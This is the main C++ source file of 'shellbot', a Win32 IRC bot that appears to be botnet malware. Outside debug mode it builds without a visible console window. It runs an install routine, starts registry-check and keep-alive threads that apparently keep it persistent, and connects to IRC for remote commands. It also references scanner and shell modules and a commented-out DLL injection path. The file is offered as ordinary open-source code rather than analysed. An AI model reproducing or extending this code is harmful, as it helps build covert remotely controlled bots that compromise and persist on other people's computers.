/*	shellbot - a high performance IRC bot for Win32
	Copyright (C) 2005 Shellz

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. 
*/

#include "vInclude.h"
#include "vPOEb.h"
#include "vExterns.h"

#pragma optimize("gsy",on)
#pragma warning(disable:4786)
#pragma comment(linker,"/ignore:4078")
#pragma comment(linker,"/opt:nowin98")
#pragma comment(linker,"/merge:.rdata=.data")
#pragma comment(linker,"/merge:.reloc=.data")

#ifdef DEBUG_MODE 
	#pragma comment(linker, "/subsystem:console")
#else
	#pragma comment(linker,"/subsystem:windows")
#endif

using namespace std;
CPOEb *vPOEb=NULL;

void CPOEb::DebugPrint(const char* szBracket, ostream& (*colorManip)(ostream&), const char* szPrint,...) {
	va_list va_alist; char formatbuf[8192]; va_start(va_alist, szPrint);
	_vsnprintf(formatbuf, sizeof(formatbuf), szPrint, va_alist); va_end(va_alist);
	cout << endl << colorManip << "[" << con::fg_white << szBracket << 
	colorManip << "] " << con::fg_white << formatbuf;
}


int CPOEb::POEb(void) {
	botRunning = true;
	vPOEscan.main.bRunning = false;
	vPOEshell.main.bRunning = true;
	WSADATA initSock;
	if (WSAStartup(MAKEWORD(2,0), &initSock)) {   
		ExitProcess(0);
	}
	vPOEb->vIRC.Init();
	vPOEb->vInstall.SetParameters();
	vInstall.Run();
#ifndef SERVICE
	InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x80000400); 
	vRegcheck.Start(true);
	vPOEb->vKeepAlive.Start(true);
	HANDLE hIRC;
	hIRC = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunIRC, NULL, 0, 0);
	WaitForSingleObject(hIRC, INFINITE);
   	ReleaseMutex(vPOEb->vInstall.hMutex);
	CloseHandle(hIRC);	
	WSACleanup();
	DeleteCriticalSection(&CriticalSection);
#endif
//	cmail.Run();
	return 0; 
}

#ifdef DEBUG_MODE
int main(int argc, char* argv[])
#else
int _stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine, int nShowCmd)
#endif // DEBUGMODE
{		
	vPOEb = new CPOEb;
//	CJupe *jClientJupe = new CJupe;
	vPOEb->DebugPrint("bot",con::fg_red,"shellbot version %s starting...",VERSION_SHELLBOT);
/*#ifdef INJECT_DLL
	if (lpCmdLine) { cout << "Already injected" << endl; vPOEb->bInjected = true; }
	else vPOEb->bInjected = false;
#endif	*/
	vPOEb->POEb(); 
	return 0;
}

